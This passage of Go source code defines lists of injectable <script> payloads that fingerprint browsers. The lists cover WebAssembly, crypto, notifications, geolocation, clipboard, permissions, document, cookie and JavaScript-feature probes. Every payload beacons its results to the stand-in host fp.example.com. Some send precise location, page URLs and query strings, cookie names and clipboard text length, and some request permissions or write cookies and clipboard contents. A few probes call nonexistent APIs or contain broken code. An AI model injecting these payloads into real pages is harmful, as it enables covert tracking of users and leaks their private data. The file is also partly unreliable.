	{Raw: `<script>new Image().src='//fp.example.com/wasm5?global='+(typeof WebAssembly.Global!=='undefined'?'1':'0')+'&module='+(typeof WebAssembly.Module!=='undefined'?'1':'0');</script>`, Description: "WASM-Global/Module", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm6?instance='+(typeof WebAssembly.Instance!=='undefined'?'1':'0')+'&compileError='+(typeof WebAssembly.CompileError!=='undefined'?'1':'0');</script>`, Description: "WASM-Instance/Error", FPType: FingerprintHardware},
	{Raw: `<script>try{var wasm=new Uint8Array([0,97,115,109,1,0,0,0]);var mod=new WebAssembly.Module(wasm);new Image().src='//fp.example.com/wasm7?mod=1&size='+mod.exports.length;}catch(e){new Image().src='//fp.example.com/wasm7?mod=0';}</script>`, Description: "WASM-最小模块编译", FPType: FingerprintHardware},
	{Raw: `<script>try{var wasm=new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,2,127,127,1,127,3,2,1,0,7,7,1,3,97,100,100,0,0,10,9,1,7,0,32,0,32,1,106,11]);WebAssembly.instantiate(wasm).then(function(m){new Image().src='//fp.example.com/wasm8?inst=1';});}catch(e){}</script>`, Description: "WASM-简单函数编译", FPType: FingerprintHardware},
	{Raw: `<script>try{WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0]));new Image().src='//fp.example.com/wasm9?valid=1';}catch(e){new Image().src='//fp.example.com/wasm9?valid=0';}</script>`, Description: "WASM-验证功能", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm10?bulk='+(WebAssembly&&WebAssembly.Memory&&WebAssembly.Memory.prototype.grow?'1':'0');</script>`, Description: "WASM-内存增长", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm11?maxP='+(WebAssembly&&WebAssembly.Memory?8192:'0');</script>`, Description: "WASM-最大内存页", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm12?shared='+(typeof SharedArrayBuffer!=='undefined'?'1':'0')+'&wasm='+(typeof WebAssembly!=='undefined'?'1':'0');</script>`, Description: "WASM-SharedArrayBuffer", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm13?simd='+(WebAssembly&&WebAssembly.validate&&WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,12,1,0,10,9,1,7,0,65,0,253,15,26,11]))?'1':'0');</script>`, Description: "WASM-SIMD支持", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm14?threads='+(WebAssembly&&WebAssembly.Memory&&WebAssembly.Memory.prototype.buffer&&new WebAssembly.Memory({initial:1,maximum:1,shared:true}).buffer instanceof SharedArrayBuffer?'1':'0');</script>`, Description: "WASM-线程共享内存", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm15?ref='+(WebAssembly&&WebAssembly.Table&&WebAssembly.Table.prototype.grow?'1':'0');</script>`, Description: "WASM-Reference Types", FPType: FingerprintHardware},
}

var fingerprintCrypto = []Payload{
	{Raw: `<script>if(window.crypto&&window.crypto.subtle){new Image().src='//fp.example.com/crypto?sub='+(typeof crypto.subtle.digest==='function'?'1':'0')+'&enc='+(typeof crypto.subtle.encrypt==='function'?'1':'0');}</script>`, Description: "Crypto-WebCrypto API", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto2?random='+typeof crypto.getRandomValues+'&uuid='+(crypto.randomUUID?'1':'0');</script>`, Description: "Crypto-随机数检测", FPType: FingerprintHardware},
	{Raw: `<script>var algo=['SHA-1','SHA-256','SHA-384','SHA-512'];var r={};algo.forEach(function(a){try{r[a]=!!crypto.subtle.digest(a,new Uint8Array(1));}catch(e){r[a]=false;}});new Image().src='//fp.example.com/crypto3?d='+encodeURIComponent(JSON.stringify(r));</script>`, Description: "Crypto-SHA算法支持", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto4?enc='+(crypto.subtle&&crypto.subtle.encrypt?'1':'0')+'&dec='+(crypto.subtle&&crypto.subtle.decrypt?'1':'0');</script>`, Description: "Crypto-加密解密", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto5?sign='+(crypto.subtle&&crypto.subtle.sign?'1':'0')+'&verify='+(crypto.subtle&&crypto.subtle.verify?'1':'0');</script>`, Description: "Crypto-签名验证", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto6?genK='+(crypto.subtle&&crypto.subtle.generateKey?'1':'0')+'&derive='+(crypto.subtle&&crypto.subtle.deriveKey?'1':'0');</script>`, Description: "Crypto-密钥生成/派生", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto7?expK='+(crypto.subtle&&crypto.subtle.exportKey?'1':'0')+'&impK='+(crypto.subtle&&crypto.subtle.importKey?'1':'0');</script>`, Description: "Crypto-密钥导出/导入", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto8?wrap='+(crypto.subtle&&crypto.subtle.wrapKey?'1':'0')+'&unw='+(crypto.subtle&&crypto.subtle.unwrapKey?'1':'0');</script>`, Description: "Crypto-密钥包装", FPType: FingerprintHardware},
	{Raw: `<script>var a=new Uint8Array(16);crypto.getRandomValues(a);var h=0;for(var i=0;i<16;i++)h=((h<<5)-h)+a[i];h|=0;new Image().src='//fp.example.com/crypto9?rnd='+h;</script>`, Description: "Crypto-随机字节哈希", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto10?uuid='+((typeof crypto.randomUUID==='function')?crypto.randomUUID().substring(0,8):'na');</script>`, Description: "Crypto-randomUUID", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto11?ms='+(typeof msCrypto!=='undefined'?'1':'0')+'&wk='+(typeof webkitCrypto!=='undefined'?'1':'0');</script>`, Description: "Crypto-前缀检测", FPType: FingerprintHardware},
	{Raw: `<script>try{crypto.subtle.digest('SHA-256',new TextEncoder().encode('fp')).then(function(h){var b=new Uint8Array(h);var s=b.reduce(function(a,v){return a+v.toString(16).padStart(2,'0');},'');new Image().src='//fp.example.com/crypto12?h='+s.substring(0,16);});}catch(e){}</script>`, Description: "Crypto-SHA-256哈希", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto13?algo='+(crypto.subtle&&crypto.subtle.algorithms?1:0);</script>`, Description: "Crypto-SubtleCrypto算法", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto14?pb='+(crypto.subtle&&crypto.subtle.deriveBits?'1':'0');</script>`, Description: "Crypto-派生位", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/crypto15?tlf='+(crypto.subtle&&crypto.subtle.timingSafeEqual?'1':'0');</script>`, Description: "Crypto-定时安全比较", FPType: FingerprintHardware},
}

var fingerprintNotification = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/notif?n='+(typeof Notification!=='undefined'?'1':'0')+'&perm='+(Notification.permission||'unsupported');</script>`, Description: "通知-API与权限", FPType: FingerprintPlugin},
	{Raw: `<script>try{Notification.requestPermission().then(function(p){new Image().src='//fp.example.com/notif2?p='+p;});}catch(e){new Image().src='//fp.example.com/notif2?err=1';}</script>`, Description: "通知-请求权限", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif3?tags='+(Notification&&Notification.maxActions?'1':'0')+'&actions='+(Notification.prototype.hasOwnProperty('actions')?'1':'0');</script>`, Description: "通知-动作支持", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif4?icon='+(Notification.prototype.close?'1':'0')+'&silent='+(Notification.silent?'1':'0');</script>`, Description: "通知-静默通知", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif5?badge='+('badge' in Notification.prototype?'1':'0')+'&image='+('image' in Notification.prototype?'1':'0');</script>`, Description: "通知-富媒体通知", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif6?vib='+(Notification.prototype.vibrate?'1':'0')+'&data='+('data' in Notification.prototype?'1':'0');</script>`, Description: "通知-振动/数据", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif7?push='+('PushManager' in window?'1':'0')+'&msg='+('PushSubscription' in window?'1':'0');</script>`, Description: "通知-Push API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif8?click='+(Notification.prototype.onclick?'1':'0')+'&close='+(Notification.prototype.onclose?'1':'0');</script>`, Description: "通知-事件处理", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif9?show='+(Notification.prototype.onshow?'1':'0')+'&err='+(Notification.prototype.onerror?'1':'0');</script>`, Description: "通知-显示/错误事件", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif10?support='+(('Notification' in window)?Notification.permission:'na');</script>`, Description: "通知-完整支持检测", FPType: FingerprintPlugin},
	{Raw: `<script>try{var sw=navigator.serviceWorker;if(sw){sw.ready.then(function(r){new Image().src='//fp.example.com/notif11?pm='+(r.pushManager?'1':'0')+'&gv='+(r.pushManager&&r.pushManager.getSubscription?'1':'0');});}}catch(e){}</script>`, Description: "通知-SW Push支持", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif12?req='+(typeof Notification!=='undefined'&&typeof Notification.requestPermission==='function'?'1':'0');</script>`, Description: "通知-请求权限API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif13?dir='+(Notification.dir||'auto')+'&lang='+(Notification.lang||'default');</script>`, Description: "通知-方向和语言", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif14?renot='+('renotify' in Notification.prototype?'1':'0')+'&reqInt='+('requireInteraction' in Notification.prototype?'1':'0');</script>`, Description: "通知-重新通知/交互要求", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/notif15?no='+(('Notification' in window&&Notification.permission==='default')?'1':'0');</script>`, Description: "通知-默认权限检测", FPType: FingerprintPlugin},
}

var fingerprintGeolocation = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/geo?api='+('geolocation' in navigator?'1':'0');</script>`, Description: "地理-API检测", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){new Image().src='//fp.example.com/geo2?acc='+p.coords.accuracy+'&lat='+p.coords.latitude.toFixed(2)+'&lng='+p.coords.longitude.toFixed(2);},function(){new Image().src='//fp.example.com/geo2?err=1';},{timeout:1000});}</script>`, Description: "地理-获取位置", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo3?watch='+(navigator.geolocation&&navigator.geolocation.watchPosition?'1':'0');</script>`, Description: "地理-watchPosition", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.geolocation){navigator.geolocation.watchPosition(function(p){new Image().src='//fp.example.com/geo4?alt='+(p.coords.altitude||'na')+'&altAcc='+(p.coords.altitudeAccuracy||'na');navigator.geolocation.clearWatch(arguments.callee.id);});}</script>`, Description: "地理-海拔检测", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){new Image().src='//fp.example.com/geo5?speed='+(p.coords.speed||'na')+'&head='+(p.coords.heading||'na');},function(){},{timeout:1000});}</script>`, Description: "地理-速度/方向", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo6?perm='+(navigator.permissions?'1':'0');if(navigator.permissions){navigator.permissions.query({name:'geolocation'}).then(function(s){new Image().src='//fp.example.com/geo7?state='+s.state;})}</script>`, Description: "地理-权限查询", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo8?enable='+(!!navigator.geolocation?'1':'0');</script>`, Description: "地理-是否可用", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo9?prot='+Object.getOwnPropertyNames(Object.getPrototypeOf(navigator.geolocation||{})).join(',').length;</script>`, Description: "地理-原型属性", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo10?clear='+(navigator.geolocation&&navigator.geolocation.clearWatch?'1':'0');</script>`, Description: "地理-clearWatch", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo11?perm='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');</script>`, Description: "地理-权限查询API", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.geolocation.getCurrentPosition(function(p){var ts=p.timestamp;new Image().src='//fp.example.com/geo12?ts='+ts;},function(){},{timeout:500});}catch(e){}</script>`, Description: "地理-时间戳", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo13?opt='+(navigator.geolocation&&navigator.geolocation.getCurrentPosition&&navigator.geolocation.getCurrentPosition.length!==undefined?navigator.geolocation.getCurrentPosition.length:'na');</script>`, Description: "地理-参数数量", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo14?gmaps='+(typeof google!=='undefined'&&google.maps?'1':'0');</script>`, Description: "地理-GMaps检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/geo15?wifi='+('wifi' in navigator?'1':'0')+'&bluetooth='+('bluetooth' in navigator?'1':'0');</script>`, Description: "地理-无线检测", FPType: FingerprintHardware},
}

var fingerprintClipboard = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/clip?api='+(navigator.clipboard?'1':'0')+'&read='+(navigator.clipboard&&navigator.clipboard.read?'1':'0')+'&write='+(navigator.clipboard&&navigator.clipboard.write?'1':'0');</script>`, Description: "剪贴板-API检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip2?readT='+(navigator.clipboard&&navigator.clipboard.readText?'1':'0')+'&writeT='+(navigator.clipboard&&navigator.clipboard.writeText?'1':'0');</script>`, Description: "剪贴板-文本读写", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.clipboard&&navigator.clipboard.readText){navigator.clipboard.readText().then(function(t){new Image().src='//fp.example.com/clip3?len='+t.length;},function(){new Image().src='//fp.example.com/clip3?err=1';})}</script>`, Description: "剪贴板-读取文本", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip4?event='+(typeof ClipboardEvent!=='undefined'?'1':'0')+'&data='+(typeof DataTransfer!=='undefined'?'1':'0');</script>`, Description: "剪贴板-事件API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip5?perm='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');if(navigator.permissions){navigator.permissions.query({name:'clipboard-read'}).then(function(s){new Image().src='//fp.example.com/clip6?state='+s.state;})}</script>`, Description: "剪贴板-权限查询", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip7?async='+('ClipboardItem' in window?'1':'0')+'&write='+(navigator.clipboard&&navigator.clipboard.write?'1':'0');</script>`, Description: "剪贴板-ClipboardItem", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip8?permQ='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');</script>`, Description: "剪贴板-权限检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip9?exec='+(document.execCommand?'1':'0')+'&copy='+(document.queryCommandSupported&&document.queryCommandSupported('copy')?'1':'0');</script>`, Description: "剪贴板-execCommand", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip10?proto='+Object.getOwnPropertyNames(Navigator.prototype).filter(function(p){return p.indexOf('clipboard')>=0;}).length;</script>`, Description: "剪贴板-Navigator原型", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip11?readF='+(navigator.clipboard&&navigator.clipboard.read?'1':'0')+'&writeF='+(navigator.clipboard&&navigator.clipboard.write?'1':'0');</script>`, Description: "剪贴板-功能完整性", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip12?s='+('Clipboard' in window?'1':'0')+'&r='+(typeof ClipboardItem!=='undefined'?'1':'0');</script>`, Description: "剪贴板-Clipboard全局", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.clipboard.writeText('__fp_test__').then(function(){navigator.clipboard.readText().then(function(t){new Image().src='//fp.example.com/clip13?ok='+(t==='__fp_test__'?'1':'0');})});}catch(e){}</script>`, Description: "剪贴板-读写往返", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip14?iat='+(typeof ClipboardItem==='function'?ClipboardItem.length:'na');</script>`, Description: "剪贴板-构造函数参数", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/clip15?paste='+(document.queryCommandSupported&&document.queryCommandSupported('paste')?'1':'0');</script>`, Description: "剪贴板-粘贴支持", FPType: FingerprintPlugin},
}

var fingerprintPermissions = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/perm?api='+(navigator.permissions?'1':'0');</script>`, Description: "权限-API检测", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){var names=['geolocation','notifications','push','midi','camera','microphone','speaker','device-info','background-sync','bluetooth','persistent-storage','ambient-light-sensor','accelerometer','gyroscope','magnetometer','clipboard-read','clipboard-write'];var r={};var done=0;names.forEach(function(n){try{navigator.permissions.query({name:n}).then(function(s){r[n]=s.state;done++;if(done===names.length){new Image().src='//fp.example.com/perm2?d='+encodeURIComponent(JSON.stringify(r));}});}catch(e){r[n]='error';done++;if(done===names.length){new Image().src='//fp.example.com/perm2?d='+encodeURIComponent(JSON.stringify(r));}}});}</script>`, Description: "权限-批量查询", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/perm3?query='+(navigator.permissions&&navigator.permissions.query?'1':'0');</script>`, Description: "权限-query方法", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'camera'}).then(function(s){new Image().src='//fp.example.com/perm4?cam='+s.state;})}</script>`, Description: "权限-相机权限", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'microphone'}).then(function(s){new Image().src='//fp.example.com/perm5?mic='+s.state;})}</script>`, Description: "权限-麦克风权限", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'notifications'}).then(function(s){new Image().src='//fp.example.com/perm6?notif='+s.state;})}</script>`, Description: "权限-通知权限", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'persistent-storage'}).then(function(s){new Image().src='//fp.example.com/perm7?ps='+s.state;})}</script>`, Description: "权限-持久存储", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'midi'}).then(function(s){new Image().src='//fp.example.com/perm8?midi='+s.state;})}</script>`, Description: "权限-MIDI权限", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'bluetooth'}).then(function(s){new Image().src='//fp.example.com/perm9?bt='+s.state;})}</script>`, Description: "权限-蓝牙权限", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions&&navigator.permissions.revoke){navigator.permissions.revoke({name:'clipboard-write'}).then(function(s){new Image().src='//fp.example.com/perm10?revoke=1';});}else{new Image().src='//fp.example.com/perm10?revoke=0';}</script>`, Description: "权限-撤销权限", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/perm11?revoke='+(navigator.permissions&&navigator.permissions.revoke?'1':'0');</script>`, Description: "权限-revoke方法", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'accelerometer'}).then(function(s){new Image().src='//fp.example.com/perm12?accel='+s.state;})}</script>`, Description: "权限-加速度传感器", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'gyroscope'}).then(function(s){new Image().src='//fp.example.com/perm13?gyro='+s.state;})}</script>`, Description: "权限-陀螺仪权限", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'magnetometer'}).then(function(s){new Image().src='//fp.example.com/perm14?mag='+s.state;})}</script>`, Description: "权限-磁力计权限", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/perm15?prot='+(window.Permissions?'1':'0')+'&status='+(window.PermissionStatus?'1':'0');</script>`, Description: "权限-构造函数检测", FPType: FingerprintPlugin},
}

var fingerprintReferrer = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/refer?r='+encodeURIComponent(document.referrer)+'&url='+encodeURIComponent(document.URL)+'&domain='+encodeURIComponent(document.domain);</script>`, Description: "Referrer-文档信息", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer2?pr='+(document.referrer.length)+'&dt='+document.title.length+'&dc='+document.characterSet;</script>`, Description: "Referrer-文档属性", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer3?policy='+(document.referrerPolicy||'na')+'&lm='+document.lastModified;</script>`, Description: "Referrer-策略检查", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer4?dt='+encodeURIComponent(document.title.substring(0,30))+'&enc='+document.inputEncoding;</script>`, Description: "Referrer-标题编码", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer5?loc='+encodeURIComponent(window.location.href)+'&orig='+encodeURIComponent(window.origin);</script>`, Description: "Referrer-location", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer6?port='+window.location.port+'&proto='+window.location.protocol+'&host='+window.location.host;</script>`, Description: "Referrer-URL解析", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer7?hash='+window.location.hash.length+'&path='+encodeURIComponent(window.location.pathname);</script>`, Description: "Referrer-hash/path", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer8?anc='+document.anchors.length+'&form='+document.forms.length+'&img='+document.images.length+'&link='+document.links.length;</script>`, Description: "Referrer-文档元素计数", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer9?cont='+document.contentType+'&mode='+document.compatMode+'&des='+document.designMode;</script>`, Description: "Referrer-文档模式", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer10?vis='+document.visibilityState+'&hidden='+(document.hidden?'1':'0');</script>`, Description: "Referrer-可见性", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer11?dir='+document.dir+'&lang='+document.documentElement.lang;</script>`, Description: "Referrer-文档方向/语言", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer12?fram='+(window.frameElement?'1':'0')+'&parent='+(window.parent!==window?'1':'0')+'&top='+(window.top!==window?'1':'0');</script>`, Description: "Referrer-iframe检测", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer13?open='+(window.opener?'1':'0')+'&hist='+history.length+'&foc='+(document.hasFocus()?'1':'0');</script>`, Description: "Referrer-窗口历史", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer14?proto='+encodeURIComponent(location.protocol)+'&search='+encodeURIComponent(location.search);</script>`, Description: "Referrer-协议/搜索", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/refer15?anc='+(location.ancestorOrigins?location.ancestorOrigins.length:'na');</script>`, Description: "Referrer-祖先来源", FPType: FingerprintScreen},
}

var fingerprintCookie = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/cookie?ce='+(navigator.cookieEnabled?'1':'0')+'&cl='+(document.cookie.length)+'&dm='+document.domain;</script>`, Description: "Cookie-启用状态", FPType: FingerprintPlugin},
	{Raw: `<script>var c=document.cookie.split(';');var names=[];for(var i=0;i<c.length;i++){names.push(c[i].split('=')[0].trim());}new Image().src='//fp.example.com/cookie2?cnt='+c.length+'&first='+encodeURIComponent(names[0]||'');</script>`, Description: "Cookie-数量与键名", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cookie3?sec='+(document.cookie.indexOf('Secure')>=0?'1':'0')+'&http='+(document.cookie.indexOf('HttpOnly')>=0?'1':'0');</script>`, Description: "Cookie-安全属性检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cookie4?same='+(document.cookie.indexOf('SameSite')>=0?'1':'0')+'&sec='+(document.cookie.indexOf('Secure')>=0?'1':'0');</script>`, Description: "Cookie-SameSite检测", FPType: FingerprintPlugin},
	{Raw: `<script>try{var t='__fptest__='+Math.random()+';max-age=1;path=/';document.cookie=t;var ok=document.cookie.indexOf('__fptest__')>=0;document.cookie='__fptest__=;max-age=0;path=/';new Image().src='//fp.example.com/cookie5?rw='+(ok?'1':'0');}catch(e){new Image().src='//fp.example.com/cookie5?rw=err';}</script>`, Description: "Cookie-可写性测试", FPType: FingerprintPlugin},
	{Raw: `<script>var s=document.cookie.length;new Image().src='//fp.example.com/cookie6?len='+s+'&avg='+((s>0&&document.cookie.split(';').length>0)?Math.round(s/document.cookie.split(';').length):0);</script>`, Description: "Cookie-平均长度", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cookie7?third='+(!document.cookie?'none':'unknown');</script>`, Description: "Cookie-第三方检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cookie8?defined='+(document.cookie!==undefined?'1':'0');</script>`, Description: "Cookie-属性存在性", FPType: FingerprintPlugin},
	{Raw: `<script>try{document.cookie='__fp_cs__=1;SameSite=Strict;path=/';new Image().src='//fp.example.com/cookie9?ss=1';}catch(e){new Image().src='//fp.example.com/cookie9?ss=0';}</script>`, Description: "Cookie-SameSite Strict", FPType: FingerprintPlugin},
	{Raw: `<script>try{document.cookie='__fp_cl__=1;SameSite=Lax;path=/';new Image().src='//fp.example.com/cookie10?sl=1';}catch(e){new Image().src='//fp.example.com/cookie10?sl=0';}</script>`, Description: "Cookie-SameSite Lax", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cookie11?3rd='+(window.location.hostname!==document.domain?'1':'0')+'&ce='+(navigator.cookieEnabled?'1':'0');</script>`, Description: "Cookie-域名差异", FPType: FingerprintScreen},
	{Raw: `<script>try{var pairs=document.cookie.split(';').length;new Image().src='//fp.example.com/cookie12?num='+pairs;}catch(e){new Image().src='//fp.example.com/cookie12?num=err';}</script>`, Description: "Cookie-键值对数", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cookie13?ct='+(document.cookie.indexOf('__utma')>=0?'ga':'none');</script>`, Description: "Cookie-GA检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cookie14?ads='+(document.cookie.indexOf('__gads')>=0?'1':'0')+'&fb='+(document.cookie.indexOf('_fbp')>=0?'1':'0');</script>`, Description: "Cookie-广告追踪检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cookie15?has='+((document.cookie||'').length>0?'1':'0')+'&default='+(navigator.cookieEnabled?'1':'0');</script>`, Description: "Cookie-综合检测", FPType: FingerprintPlugin},
}

var fingerprintJSFeatures = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/js?es6='+(typeof Symbol!=='undefined'?'1':'0')+'&iter='+(typeof Symbol!=='undefined'&&Symbol.iterator?'1':'0')+'&map='+(typeof Map!=='undefined'?'1':'0')+'&set='+(typeof Set!=='undefined'?'1':'0')+'&prom='+(typeof Promise!=='undefined'?'1':'0');</script>`, Description: "JS-ES6基础特性", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js2?proxy='+(typeof Proxy!=='undefined'?'1':'0')+'&reflect='+(typeof Reflect!=='undefined'?'1':'0')+'&gen='+(typeof(GeneratorFunction)!=='undefined'?'1':'0')+'&async='+(typeof(async function(){})==='function'?'1':'0');</script>`, Description: "JS-高级特性", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js3?arr='+(typeof Array.from==='function'?'1':'0')+'&find='+(typeof [].find==='function'?'1':'0')+'&include='+(typeof [].includes==='function'?'1':'0')+'&obj='+(typeof Object.assign==='function'?'1':'0');</script>`, Description: "JS-ES6数组对象", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js4?str='+(typeof ''.startsWith==='function'?'1':'0')+'&pad='+(typeof ''.padStart==='function'?'1':'0')+'&trim='+(typeof ''.trimEnd==='function'?'1':'0')+'&rep='+(typeof ''.repeat==='function'?'1':'0');</script>`, Description: "JS-ES6字符串", FPType: FingerprintHardware},
	{Raw: `<script>try{var a=class{};new Image().src='//fp.example.com/js5?cls=1';}catch(e){new Image().src='//fp.example.com/js5?cls=0';}</script>`, Description: "JS-类语法支持", FPType: FingerprintHardware},
	{Raw: `<script>try{eval('var f=(a=1)=>a');new Image().src='//fp.example.com/js6?arrow=1';}catch(e){new Image().src='//fp.example.com/js6?arrow=0';}</script>`, Description: "JS-箭头函数", FPType: FingerprintHardware},
	{Raw: `<script>try{eval('var [a,b]=[1,2]');new Image().src='//fp.example.com/js7?destruct=1';}catch(e){new Image().src='//fp.example.com/js7?destruct=0';}</script>`, Description: "JS-解构赋值", FPType: FingerprintHardware},
	{Raw: `<script>try{eval('var a={...{}}');new Image().src='//fp.example.com/js8?spread=1';}catch(e){new Image().src='//fp.example.com/js8?spread=0';}</script>`, Description: "JS-展开运算符", FPType: FingerprintHardware},
